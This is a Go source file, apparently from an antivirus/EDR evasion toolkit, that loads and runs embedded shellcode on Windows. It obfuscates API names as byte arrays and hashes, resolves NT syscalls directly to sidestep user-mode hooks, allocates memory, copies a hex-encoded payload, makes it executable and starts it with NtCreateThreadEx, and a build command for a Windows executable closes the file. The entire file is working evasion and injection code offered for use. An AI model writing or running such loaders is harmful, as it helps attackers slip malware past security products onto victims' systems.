//good
package main

import (
	Go2gabh "Go2bypass/Doge-Gabh/Gabh"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/hex"
	"fmt"

	"log"
	"syscall"
	"unsafe"
)

func main() {
	//
	//
	sc, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("%s", errShellcode.Error()))
	}
	var thisThread = uintptr(0xffffffffffffffff)
	alloc, e := Go2gabh.GetSSNByNameExcept(str2sha1(string([]byte{'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'})), str2sha1)
	if e != nil {
		panic(e)
	}
	protect, e := Go2gabh.GetSSNByNameExcept(Sha256Hex(string([]byte{'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'})), Sha256Hex)
	if e != nil {
		panic(e)
	}
	//createthread
	ctd, e := Go2gabh.GetSSNByNameExcept(Sha256Hex(string([]byte{'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x'})), Sha256Hex)
	if e != nil {
		panic(e)
	}
	//pWaitForSingleObject
	pWFSlObt, _, e := Go2gabh.DiskFuncPtr(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}), str2sha1(string([]byte{'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't'})), str2sha1)
	if e != nil {
		panic(e)
	}
	createThread(sc, thisThread, uint16(alloc), uint16(protect), uint16(ctd), pWFSlObt)
}

func createThread(sc []byte, handle uintptr, alloc, protect, ctd uint16, pWFSlObt uint64) {
	const (
		mt = uintptr(0x00001000)
		me = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(sc))
	r1, r := Go2gabh.HgSyscall(
		alloc, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(mt|me),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	//copy shellcode
	memcpy(baseA, sc)

	var oldprotect uintptr
	r1, r = Go2gabh.HgSyscall(
		protect, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	var hhosthread uintptr
	r1, r = Go2gabh.HgSyscall(
		ctd,                                  //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.Syscall(uintptr(pWFSlObt), 2, hhosthread, 0xffffffff, 0)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
}

func memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

func Sha256Hex(s string) string {
	return hex.EncodeToString(Sha256([]byte(s)))
}

func Sha256(data []byte) []byte {
	digest := sha256.New()
	digest.Write(data)
	return digest.Sum(nil)
}

// export GOOS=windows GOARCH=amd64;go build -o goCreateThread.exe cmd/CreateThread/main.go
